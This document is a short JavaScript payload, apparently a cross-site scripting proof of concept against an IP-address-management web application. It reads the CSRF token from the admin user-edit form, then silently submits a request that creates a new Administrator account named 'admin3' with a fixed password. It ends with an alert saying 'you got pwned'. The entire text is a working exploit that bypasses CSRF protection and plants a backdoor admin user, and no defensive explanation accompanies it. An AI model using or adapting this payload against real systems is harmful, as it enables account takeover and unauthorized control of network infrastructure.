var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {

        const regex = new RegExp("name=\"csrf_cookie\" value=\"([^\"]*)\"");

        csrf_token = regex.exec(xhr.responseText)[1];

        encoded_csrf_token = encodeURIComponent(csrf_token);

        var http = new XMLHttpRequest();
        var url = '/app/admin/users/edit-result.php';

        var params = 'real_name=Admin3&username=admin3&email=admin3%40ehtec.co&disabled=No&role=Administrator&userId=&action=add&csrf_cookie=' + encoded_csrf_token + '&authMethod=1&password1=test1234&password2=test1234&lang=1&theme=default&notifyUser=on&mailNotify=No&mailChangelog=No&perm_vlan=0&perm_l2dom=0&perm_vrf=0&perm_devices=0&perm_racks=0&perm_circuits=0&perm_nat=0&perm_customers=0&perm_locations=0&perm_vaults=0';

        http.open('POST', url, true);

        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

        http.onreadystatechange = function() {
            if(http.readyState == 4 && http.status == 200) {
                alert("User admin3 added - you got pwned");
            }
        }
        http.send(params);


    }
}
xhr.open('POST', '/app/admin/users/edit.php', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send('action=add');
